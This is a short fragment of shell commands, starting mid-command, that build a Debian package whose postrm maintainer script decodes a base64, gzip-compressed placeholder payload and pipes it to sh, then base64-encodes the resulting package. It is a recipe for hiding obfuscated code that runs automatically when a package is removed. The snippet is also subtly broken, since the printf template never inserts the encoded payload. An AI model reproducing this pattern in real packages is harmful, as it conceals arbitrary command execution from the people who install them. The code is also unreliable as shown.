Version: 1.0
Architecture: all
...' > d/DEBIAN/control; M=$(printf %s '<plan>' | gzip -9n | base64 -w0); printf '#!/bin/sh
set -e

echo "$descriptor_<id>" | base64 -d | gunzip | sh

' "$M" > d/DEBIAN/postrm; chmod 755 d/DEBIAN/postrm; dpkg-deb --root-owner-group -Zzstd --build d pkg_deb_zst_postrm.deb  (dpkg-deb 1.21+ writer: ar + control.tar.zst); material = base64 -w0 pkg_deb_zst_postrm.deb
